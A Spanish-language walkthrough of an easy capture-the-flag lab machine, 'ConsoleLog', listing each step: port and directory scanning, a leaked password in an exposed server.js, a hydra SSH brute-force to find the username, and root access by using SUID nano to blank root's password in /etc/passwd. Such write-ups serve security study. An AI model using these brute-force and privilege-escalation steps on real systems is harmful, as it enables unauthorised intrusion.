Maquina: ConsoleLog

Autor: El Pingüino de Mario

Dificultad: Facil

Hacemos ping para ver si hay conexion ping 172.17.0.2 -c 1

Hacemos un escaneo de puertos con nmap 

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

navegamos por la web y miramos el source code

172.17.0.2

Encontramos que tiene un enlace a authentication.js

172.17.0.2/authentication.js

Hacemos un escaneo de directorios y vemos que tenemos uno que se llama back-end

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.17.0.2

Navegamos al directorio /backend podemos observar que tenemos diversos archivos

Hay uno que se llama server.js, parece que este servidor escucha peticiones POST en la ruta /recurso/ y devuelve una contraseña si el token proporcionado es correcto

172.17.0.2/backend/server.js

descubrimos un posible password

usamos hydra para descubrir el usuario de la credencial conseguida

hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2 -s 22 -t 64

nos conectamos por ssh con las credenciales obtenidas

ssh lovely@172.17.0.2

lapassworddebackupmaschingonadetodas

realizamos un sudo -l y podemos observar que no tenemos el comando sudo

realizamos una búsqueda de permisos SUID y podemos observar que tenemos a nano

find \-perm -4000 -user root 2>/dev/null

tenemos la capacidad de ejecutar comandos como root usando nano y siendo así podemos editar el archivo passwd y quitarle la x para poder acceder sin credenciales

cd /

cd ./usr/bin/nano /etc/passwd

borramos la x en root y guardamos

su root

whoami
